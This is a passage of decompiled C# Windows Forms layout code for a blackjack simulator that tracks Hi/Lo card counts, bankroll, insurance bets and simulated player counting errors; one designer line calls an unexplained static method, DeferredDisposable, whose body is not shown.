      this.label19.Location = new Point(7, 224);
      this.label19.Name = "label19";
      this.label19.Size = new Size(407, 32);
      this.label19.TabIndex = 51;
      this.label19.Text = "Unweighted House Advantage:";
      this.lblWinOnBJ.AutoSize = true;
      this.lblWinOnBJ.Location = new Point(167, 66);
      this.lblWinOnBJ.Name = "lblWinOnBJ";
      this.lblWinOnBJ.Size = new Size(31, 32);
      this.lblWinOnBJ.TabIndex = 50;
      this.lblWinOnBJ.Text = "0";
      this.lblWinOnDouble.AutoSize = true;
      this.lblWinOnDouble.Location = new Point(167, 51);
      this.lblWinOnDouble.Name = "lblWinOnDouble";
      this.lblWinOnDouble.Size = new Size(31, 32);
      this.lblWinOnDouble.TabIndex = 49;
      this.lblWinOnDouble.Text = "0";
      this.lblNonPushingTotal.AutoSize = true;
      this.lblNonPushingTotal.Location = new Point(167, 20);
      this.lblNonPushingTotal.Name = "lblNonPushingTotal";
      this.lblNonPushingTotal.Size = new Size(31, 32);
      this.lblNonPushingTotal.TabIndex = 48;
      this.lblNonPushingTotal.Text = "0";
      this.label15.AutoSize = true;
      this.label15.Location = new Point(7, 97);
      this.label15.Name = "label15";
      this.label15.Size = new Size(260, 32);
      this.label15.TabIndex = 47;
      this.label15.Text = "P (Any Player Win):";
      this.label14.AutoSize = true;
      this.label14.Location = new Point(7, 20);
      this.label14.Name = "label14";
      this.label14.Size = new Size(340, 32);
      this.label14.TabIndex = 45;
      this.label14.Text = "Total Non-Pushing Hands";
      this.label13.AutoSize = true;
      this.label13.Location = new Point(7, 51);
      this.label13.Name = "label13";
      this.label13.Size = new Size(341, 32);
      this.label13.TabIndex = 46;
      this.label13.Text = "P (Player Win on Double):";
      this.lblPlayerWinTotal.AutoSize = true;
      this.lblPlayerWinTotal.Location = new Point(167, 97);
      this.lblPlayerWinTotal.Name = "lblPlayerWinTotal";
      this.lblPlayerWinTotal.Size = new Size(31, 32);
      this.lblPlayerWinTotal.TabIndex = 44;
      this.lblPlayerWinTotal.Text = "0";
      this.label5.AutoSize = true;
      this.label5.Location = new Point(7, 66);
      this.label5.Name = "label5";
      this.label5.Size = new Size(332, 32);
      this.label5.TabIndex = 43;
      this.label5.Text = "P (Player Win Blackjack);";
      this.groupBox6.Controls.Add((Control) this.lblInsuranceBetsLost);
      this.groupBox6.Controls.Add((Control) this.lblInsuranceBetsWon);
      this.groupBox6.Controls.Add((Control) this.label43);
      this.groupBox6.Controls.Add((Control) this.label42);
      this.groupBox6.Controls.Add((Control) this.lblTCAdjustment);
      this.groupBox6.Controls.Add((Control) this.label40);
      this.groupBox6.Controls.Add((Control) this.label39);
      this.groupBox6.Controls.Add((Control) this.label38);
      this.groupBox6.Controls.Add((Control) this.label37);
      this.groupBox6.Controls.Add((Control) this.lblBettingUnit);
      this.groupBox6.Controls.Add((Control) this.label36);
      this.groupBox6.Controls.Add((Control) this.tbAgression);
      this.groupBox6.Controls.Add((Control) this.label33);
      this.groupBox6.Controls.Add((Control) this.txtStartingBankRoll);
      this.groupBox6.Controls.Add((Control) this.lblHighestBankroll);
      this.groupBox6.Controls.Add((Control) this.lblHighestBet);
      this.groupBox6.Controls.Add((Control) this.label7);
      this.groupBox6.Controls.Add((Control) this.lblLowestBankroll);
      this.groupBox6.Controls.Add((Control) this.lblLowestCount);
      this.groupBox6.Controls.Add((Control) this.lblHighestCount);
      this.groupBox6.Controls.Add((Control) this.label32);
      this.groupBox6.Controls.Add((Control) this.label31);
      this.groupBox6.Controls.Add((Control) this.label30);
      this.groupBox6.Controls.Add((Control) this.label29);
      this.groupBox6.Controls.Add((Control) this.label27);
      this.groupBox6.Location = new Point(562, 3);
      this.groupBox6.Name = "groupBox6";
      this.groupBox6.Size = new Size(305, 310);
      this.groupBox6.TabIndex = 60;
      this.groupBox6.TabStop = false;
      this.groupBox6.Text = "HI/LOW SYSTEM TRACKING";
      this.groupBox6.Enter += new EventHandler(this.groupBox6_Enter);
      this.lblInsuranceBetsLost.AutoSize = true;
      this.lblInsuranceBetsLost.Location = new Point(202, 284);
      this.lblInsuranceBetsLost.Name = "lblInsuranceBetsLost";
      this.lblInsuranceBetsLost.Size = new Size(31, 32);
      this.lblInsuranceBetsLost.TabIndex = 70;
      this.lblInsuranceBetsLost.Text = "0";
      this.lblInsuranceBetsWon.AutoSize = true;
      this.lblInsuranceBetsWon.Location = new Point(202, 267);
      this.lblInsuranceBetsWon.Name = "lblInsuranceBetsWon";
      this.lblInsuranceBetsWon.Size = new Size(31, 32);
      this.lblInsuranceBetsWon.TabIndex = 69;
      this.lblInsuranceBetsWon.Text = "0";
      this.label43.AutoSize = true;
      this.label43.Location = new Point(48, 284);
      this.label43.Name = "label43";
      this.label43.Size = new Size(377, 32);
      this.label43.TabIndex = 68;
      this.label43.Text = "Num. of Insurance Bets Lost:";
      this.label42.AutoSize = true;
      this.label42.Location = new Point(48, 267);
      this.label42.Name = "label42";
      this.label42.Size = new Size(381, 32);
      this.label42.TabIndex = 67;
      this.label42.Text = "Num. of Insurance Bets Won:";
      this.lblTCAdjustment.AutoSize = true;
      this.lblTCAdjustment.Location = new Point(202, 220);
      this.lblTCAdjustment.Name = "lblTCAdjustment";
      this.lblTCAdjustment.Size = new Size(31, 32);
      this.lblTCAdjustment.TabIndex = 66;
      this.lblTCAdjustment.Text = "1";
      this.label40.AutoSize = true;
      this.label40.Location = new Point(57, 235);
      this.label40.Name = "label40";
      this.label40.Size = new Size(492, 32);
      this.label40.TabIndex = 65;
      this.label40.Text = " [ 1.0 for good rules, 1.5 for bad rules]:";
      this.label39.AutoSize = true;
      this.label39.Location = new Point(57, 220);
      this.label39.Name = "label39";
      this.label39.Size = new Size(314, 32);
      this.label39.TabIndex = 64;
      this.label39.Text = "True Count Adjustment:";
      this.label38.AutoSize = true;
      this.label38.Font = new Font("Microsoft Sans Serif", 15.75f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.label38.Location = new Point(78, 64);
      this.label38.Name = "label38";
      this.label38.Size = new Size(46, 61);
      this.label38.TabIndex = 63;
      this.label38.Text = "-";
      this.label37.AutoSize = true;
      this.label37.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.label37.Location = new Point(265, 67);
      this.label37.Name = "label37";
      this.label37.Size = new Size(44, 46);
      this.label37.TabIndex = 62;
      this.label37.Text = "+";
      this.lblBettingUnit.AutoSize = true;
      this.lblBettingUnit.Location = new Point(202, 109);
      this.lblBettingUnit.Name = "lblBettingUnit";
      this.lblBettingUnit.Size = new Size(31, 32);
      this.lblBettingUnit.TabIndex = 61;
      this.lblBettingUnit.Text = "0";
      this.label36.AutoSize = true;
      this.label36.Location = new Point(18, 73);
      this.label36.Name = "label36";
      this.label36.Size = new Size(159, 32);
      this.label36.TabIndex = 60;
      this.label36.Text = "Agrression:";
      this.tbAgression.LargeChange = 2;
      this.tbAgression.Location = new Point(93, 67);
      this.tbAgression.Name = "tbAgression";
      this.tbAgression.Size = new Size(177, 114);
      this.tbAgression.TabIndex = 59;
      this.tbAgression.Value = 10;
      this.tbAgression.Scroll += new EventHandler(this.tbAgression_Scroll);
      this.label33.AutoSize = true;
      this.label33.Location = new Point(18, 39);
      this.label33.Name = "label33";
      this.label33.Size = new Size(304, 32);
      this.label33.TabIndex = 58;
      this.label33.Text = "Total Starting Bankroll:";
      this.txtStartingBankRoll.Location = new Point(133, 36);
      this.txtStartingBankRoll.Name = "txtStartingBankRoll";
      this.txtStartingBankRoll.Size = new Size(138, 38);
      this.txtStartingBankRoll.TabIndex = 57;
      this.txtStartingBankRoll.Text = "50000";
      this.txtStartingBankRoll.TextChanged += new EventHandler(this.txtStartingBankRoll_TextChanged);
      this.lblHighestBankroll.AutoSize = true;
      this.lblHighestBankroll.Location = new Point(202, 145);
      this.lblHighestBankroll.Name = "lblHighestBankroll";
      this.lblHighestBankroll.Size = new Size(31, 32);
      this.lblHighestBankroll.TabIndex = 8;
      this.lblHighestBankroll.Text = "0";
      this.lblHighestBet.AutoSize = true;
      this.lblHighestBet.Location = new Point(202, 132);
      this.lblHighestBet.Name = "lblHighestBet";
      this.lblHighestBet.Size = new Size(31, 32);
      this.lblHighestBet.TabIndex = 7;
      this.lblHighestBet.Text = "0";
      this.lblLowestBankroll.AutoSize = true;
      this.lblLowestBankroll.Location = new Point(202, 158);
      this.lblLowestBankroll.Name = "lblLowestBankroll";
      this.lblLowestBankroll.Size = new Size(31, 32);
      this.lblLowestBankroll.TabIndex = 7;
      this.lblLowestBankroll.Text = "0";
      this.lblLowestCount.AutoSize = true;
      this.lblLowestCount.Location = new Point(202, 190);
      this.lblLowestCount.Name = "lblLowestCount";
      this.lblLowestCount.Size = new Size(31, 32);
      this.lblLowestCount.TabIndex = 6;
      this.lblLowestCount.Text = "0";
      this.lblHighestCount.AutoSize = true;
      this.lblHighestCount.Location = new Point(202, 177);
      this.lblHighestCount.Name = "lblHighestCount";
      this.lblHighestCount.Size = new Size(31, 32);
      this.lblHighestCount.TabIndex = 5;
      this.lblHighestCount.Text = "0";
      this.label32.AutoSize = true;
      this.label32.Location = new Point(90, 158);
      this.label32.Name = "label32";
      this.label32.Size = new Size(224, 32);
      this.label32.TabIndex = 4;
      this.label32.Text = "Lowest Bankroll:";
      this.label31.AutoSize = true;
      this.label31.Location = new Point(90, 145);
      this.label31.Name = "label31";
      this.label31.Size = new Size(231, 32);
      this.label31.TabIndex = 3;
      this.label31.Text = "Highest Bankroll:";
      this.label30.AutoSize = true;
      this.label30.Location = new Point(90, 132);
      this.label30.Name = "label30";
      this.label30.Size = new Size(170, 32);
      this.label30.TabIndex = 2;
      this.label30.Text = "Highest Bet:";
      this.label29.AutoSize = true;
      this.label29.Location = new Point(90, 190);
      this.label29.Name = "label29";
      this.label29.Size = new Size(196, 32);
      this.label29.TabIndex = 1;
      this.label29.Text = "Lowest Count:";
      this.label27.AutoSize = true;
      this.label27.Location = new Point(90, 177);
      this.label27.Name = "label27";
      this.label27.Size = new Size(203, 32);
      this.label27.TabIndex = 0;
      this.label27.Text = "Highest Count:";
      this.groupBox7.Controls.Add((Control) this.lblErrors);
      this.groupBox7.Controls.Add((Control) this.label52);
      this.groupBox7.Controls.Add((Control) this.gbError);
      this.groupBox7.Controls.Add((Control) this.groupBox8);
      this.groupBox7.Location = new Point(562, 317);
      this.groupBox7.Name = "groupBox7";
      this.groupBox7.Size = new Size(305, 258);
      this.groupBox7.TabIndex = 61;
      this.groupBox7.TabStop = false;
      this.groupBox7.Text = "HUMAN ERROR";
      this.groupBox7.Enter += new EventHandler(this.groupBox7_Enter);
      this.lblErrors.AutoSize = true;
      this.lblErrors.Location = new Point(187, 239);
      this.lblErrors.Name = "lblErrors";
      this.lblErrors.Size = new Size(31, 32);
      this.lblErrors.TabIndex = 69;
      this.lblErrors.Text = "0";
      this.label52.AutoSize = true;
      this.label52.Location = new Point(86, 238);
      this.label52.Name = "label52";
      this.label52.Size = new Size(275, 32);
      this.label52.TabIndex = 68;
      this.label52.Text = "Total Num. of Errors:";
      this.gbError.Controls.Add((Control) this.lblErrorsPer100Hands);
      this.gbError.Controls.Add((Control) this.label50);
      this.gbError.Controls.Add((Control) this.label49);
      this.gbError.Controls.Add((Control) this.label48);
      this.gbError.Controls.Add((Control) this.label46);
      this.gbError.Controls.Add((Control) this.label47);
      this.gbError.Controls.Add((Control) this.label45);
      this.gbError.Controls.Add((Control) this.label44);
      this.gbError.Controls.Add((Control) this.tbErrorRate);
      this.gbError.Enabled = false;
      this.gbError.Location = new Point(18, 60);
      this.gbError.Name = "gbError";
      this.gbError.Size = new Size(271, 174);
      this.gbError.TabIndex = 1;
      this.gbError.TabStop = false;
      this.gbError.Text = "Error Control";
      this.gbError.Enter += new EventHandler(this.gbError_Enter);
      this.lblErrorsPer100Hands.AutoSize = true;
      this.lblErrorsPer100Hands.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.lblErrorsPer100Hands.Location = new Point(57, 96);
      this.lblErrorsPer100Hands.Name = "lblErrorsPer100Hands";
      this.lblErrorsPer100Hands.Size = new Size(403, 32);
      this.lblErrorsPer100Hands.TabIndex = 69;
      this.lblErrorsPer100Hands.Text = "1 errors per every 100 hands";
      this.label50.AutoSize = true;
      this.label50.Location = new Point(10, 149);
      this.label50.Name = "label50";
      this.label50.Size = new Size(456, 32);
      this.label50.TabIndex = 68;
      this.label50.Text = "either high or low by that ammount.";
      this.label49.AutoSize = true;
      this.label49.Location = new Point(229, 64);
      this.label49.Name = "label49";
      this.label49.Size = new Size(72, 32);
      this.label49.TabIndex = 67;
      this.label49.Text = "15%";
      this.label48.AutoSize = true;
      this.label48.Location = new Point(26, 63);
      this.label48.Name = "label48";
      this.label48.Size = new Size(56, 32);
      this.label48.TabIndex = 66;
      this.label48.Text = "1%";
      this.label46.AutoSize = true;
      this.label46.Location = new Point(10, 136);
      this.label46.Name = "label46";
      this.label46.Size = new Size(668, 32);
      this.label46.TabIndex = 65;
      this.label46.Text = "and 4 (25% chance of each). The player is randomly";
      this.label47.AutoSize = true;
      this.label47.Location = new Point(12, 123);
      this.label47.Name = "label47";
      this.label47.Size = new Size(624, 32);
      this.label47.TabIndex = 64;
      this.label47.Text = "A player can miscount by any number between 1";
      this.label45.AutoSize = true;
      this.label45.Location = new Point(10, 34);
      this.label45.Name = "label45";
      this.label45.Size = new Size(657, 32);
      this.label45.TabIndex = 62;
      this.label45.Text = "player will make a counting error during each hand:";
      this.label44.AutoSize = true;
      this.label44.Location = new Point(10, 18);
      this.label44.Name = "label44";
      this.label44.Size = new Size(590, 32);
      this.label44.TabIndex = 61;
      this.label44.Text = "This error rate slider reflects the chance that a";
      this.tbErrorRate.LargeChange = 2;
      this.tbErrorRate.Location = new Point(44, 59);
      this.tbErrorRate.Maximum = 15;
      this.tbErrorRate.Minimum = 1;
      this.tbErrorRate.Name = "tbErrorRate";
      this.tbErrorRate.Size = new Size(189, 114);
      this.tbErrorRate.TabIndex = 60;
      this.tbErrorRate.Value = 1;
      this.tbErrorRate.Scroll += new EventHandler(this.tbErrorRate_Scroll);
      this.groupBox8.Controls.Add((Control) this.rbErrorsOff);
      this.groupBox8.Controls.Add((Control) this.rbErrorsOn);
      this.groupBox8.Location = new Point(18, 18);
      this.groupBox8.Name = "groupBox8";
      this.groupBox8.Size = new Size(271, 39);
      this.groupBox8.TabIndex = 0;
      this.groupBox8.TabStop = false;
      this.groupBox8.Text = "Player Error";
      this.rbErrorsOff.AutoSize = true;
      this.rbErrorsOff.Checked = true;
      this.rbErrorsOff.Location = new Point(143, 13);
      this.rbErrorsOff.Name = "rbErrorsOff";
      this.rbErrorsOff.Size = new Size(90, 36);
      this.rbErrorsOff.TabIndex = 1;
      this.rbErrorsOff.TabStop = true;
      this.rbErrorsOff.Text = "Off";
      this.rbErrorsOff.UseVisualStyleBackColor = true;
      this.rbErrorsOff.CheckedChanged += new EventHandler(this.rbErrorsOff_CheckedChanged);
      this.rbErrorsOn.AutoSize = true;
      this.rbErrorsOn.Location = new Point(98, 13);
      this.rbErrorsOn.Name = "rbErrorsOn";
      this.rbErrorsOn.Size = new Size(90, 36);
      this.rbErrorsOn.TabIndex = 0;
      this.rbErrorsOn.Text = "On";
      this.rbErrorsOn.UseVisualStyleBackColor = true;
      this.rbErrorsOn.CheckedChanged += new EventHandler(this.rbErrorsOn_CheckedChanged);
      this.cmdMultiSim.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.cmdMultiSim.Location = new Point(24, 22);
      this.cmdMultiSim.Name = "cmdMultiSim";
      this.cmdMultiSim.Size = new Size(135, 45);
      this.cmdMultiSim.TabIndex = 63;
      this.cmdMultiSim.Text = "Start Multiple Sims";
      this.cmdMultiSim.UseVisualStyleBackColor = true;
      this.cmdMultiSim.Click += new EventHandler(this.button1_Click);
      this.numericUpDown1.Location = new Point(170, 42);
      this.numericUpDown1.Maximum = new Decimal(new int[4]
      {
        5000,
        0,
        0,
        0
      });
      this.numericUpDown1.Minimum = new Decimal(new int[4]
      {
        1,
        0,
        0,
        0
      });
      this.numericUpDown1.Name = "numericUpDown1";
      this.numericUpDown1.Size = new Size(89, 38);
      this.numericUpDown1.TabIndex = 64;
      this.numericUpDown1.Value = new Decimal(new int[4]
      {
        100,
        0,
        0,
        0
      });
      this.label51.AutoSize = true;
      this.label51.Location = new Point(169, 25);
      this.label51.Name = "label51";
      this.label51.Size = new Size(245, 32);
      this.label51.TabIndex = 65;
      this.label51.Text = "Num. of iterations:";
      this.txtPath.Location = new Point(6, 76);
      this.txtPath.Name = "txtPath";
      this.txtPath.Size = new Size(264, 38);
      this.txtPath.TabIndex = 66;
      this.txtPath.Text = "[Enter Path to Save Data To Here] ie. C:\\test.txt";
      this.groupBox9.Controls.Add((Control) this.txtPath);
      this.groupBox9.Controls.Add((Control) this.label51);
      this.groupBox9.Controls.Add((Control) this.numericUpDown1);
      this.groupBox9.Controls.Add((Control) this.cmdMultiSim);
      this.groupBox9.Location = new Point(278, 337);
      this.groupBox9.Name = "groupBox9";
      this.groupBox9.Size = new Size(280, 104);
      this.groupBox9.TabIndex = 67;
      this.groupBox9.TabStop = false;
      this.groupBox9.Text = "Track Repeat Simulations:";
      this.AutoScaleDimensions = frmBlackJackSim.DeferredDisposable();
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(873, 613);
      this.Controls.Add((Control) this.groupBox9);
      this.Controls.Add((Control) this.cmdDetails);
      this.Controls.Add((Control) this.groupBox7);
      this.Controls.Add((Control) this.groupBox6);
      this.Controls.Add((Control) this.groupBox4);
      this.Controls.Add((Control) this.groupBox3);
      this.Controls.Add((Control) this.groupBox2);
      this.Controls.Add((Control) this.label10);
      this.Controls.Add((Control) this.progressBar1);
      this.Controls.Add((Control) this.rtbHandOutcome);
      this.Controls.Add((Control) this.cmdDeal);
      this.Name = nameof (frmBlackJackSim);
      this.Text = "Bertolino - Blackjack Simulation";
      this.Load += new EventHandler(this.Form1_Load);
      this.groupBox1.ResumeLayout(false);
      this.groupBox1.PerformLayout();
      this.groupBox2.ResumeLayout(false);
      this.groupBox2.PerformLayout();
      this.groupBox3.ResumeLayout(false);
      this.groupBox3.PerformLayout();
      this.groupBox5.ResumeLayout(false);
      this.groupBox5.PerformLayout();
      this.groupBox4.ResumeLayout(false);
      this.groupBox4.PerformLayout();
      this.groupBox6.ResumeLayout(false);
      this.groupBox6.PerformLayout();
      this.tbAgression.EndInit();
      this.groupBox7.ResumeLayout(false);
      this.groupBox7.PerformLayout();
      this.gbError.ResumeLayout(false);
      this.gbError.PerformLayout();
      this.tbErrorRate.EndInit();
      this.groupBox8.ResumeLayout(false);
      this.groupBox8.PerformLayout();
      this.numericUpDown1.EndInit();
      this.groupBox9.ResumeLayout(false);
      this.groupBox9.PerformLayout();
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
